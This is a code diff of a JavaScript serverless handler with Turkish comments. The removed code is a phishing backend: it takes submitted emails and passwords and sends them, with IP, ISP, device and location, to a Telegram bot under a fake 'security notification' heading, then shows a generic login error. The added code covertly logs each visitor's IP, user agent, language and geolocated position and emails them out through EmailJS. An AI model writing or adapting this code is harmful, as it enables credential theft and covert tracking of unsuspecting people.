@@ -1,50 +1,33 @@
+import fetch from 'node-fetch';
+
 export default async function handler(req, res) {
-    if (req.method !== 'POST') return res.status(405).end();
-    
-    try {
-        const { email, pass, ipData, cihaz } = req.body;
-        
-        const BOT_TOKEN = process.env.BOT_TOKEN;
-        const CHAT_ID = process.env.TELEGRAM_ID;
-        const DOGRU_SIFRE = process.env.SIFRE;
+  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  const userAgent = req.headers['user-agent'];
+  const language = req.headers['accept-language'];
+  const time = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
 
-        // Cihaz bilgisini temizleme
-        let cihazTipi = "Bilinmiyor";
-        if (cihaz) {
-            if (cihaz.includes("Android")) cihazTipi = "Android";
-            else if (cihaz.includes("iPhone")) cihazTipi = "iPhone";
-            else if (cihaz.includes("Windows")) cihazTipi = "Windows PC";
-            else cihazTipi = "Diğer";
-        }
+  // IP'den konum bilgisi çek
+  let location = 'Bilinmiyor';
+  try {
+    const geo = await fetch(`https://ipapi.co/${ip}/json/`);
+    const geoData = await geo.json();
+    location = `${geoData.city}, ${geoData.region}, ${geoData.country_name}`;
+  } catch (e) {}
 
-        const girisBasarili = (String(pass) === String(DOGRU_SIFRE));
-
-        const mesaj = `🚀 **TERCES GÜVENLİK BİLDİRİMİ**\n\n` +
-                      `📧 E-posta: ${email}\n` +
-                      `🔑 Şifre: ${pass}\n` +
-                      `📱 Cihaz: ${cihazTipi}\n` +
-                      `📡 IP: ${ipData?.ip || "Bilinmiyor"}\n` +
-                      `🏢 ISS: ${ipData?.org || "Bilinmiyor"}\n` +
-                      `📍 Konum: ${ipData?.city || "Bilinmiyor"}\n` +
-                      `✅ Durum: ${girisBasarili ? "BAŞARILI GİRİŞ" : "HATALI GİRİŞ"}`;
-
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: mesaj,
-                parse_mode: 'Markdown'
-            })
-        });
-
-        if (girisBasarili) {
-            return res.status(200).json({ success: true });
-        } else {
-            // İstediğin ortak hata mesajı burada:
-            return res.status(401).json({ success: false, message: "Hatalı e-posta veya şifre!" });
-        }
-    } catch (error) {
-        return res.status(500).json({ success: false, error: "Sistem hatası" });
-    }
-}
+  // ProtonMail'e gönder (EmailJS üzerinden)
+  await fetch('https://api.emailjs.com/api/v1.0/email/send', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      service_id: 'SENIN_SERVICE_ID',
+      template_id: 'SENIN_TEMPLATE_ID',
+      user_id: 'SENIN_PUBLIC_KEY',
+      template_params: {
+        ip: ip,
+        location: location,
+        user_agent: userAgent,
+        language: language,
+        time: time,
+      }
+    })
+  });
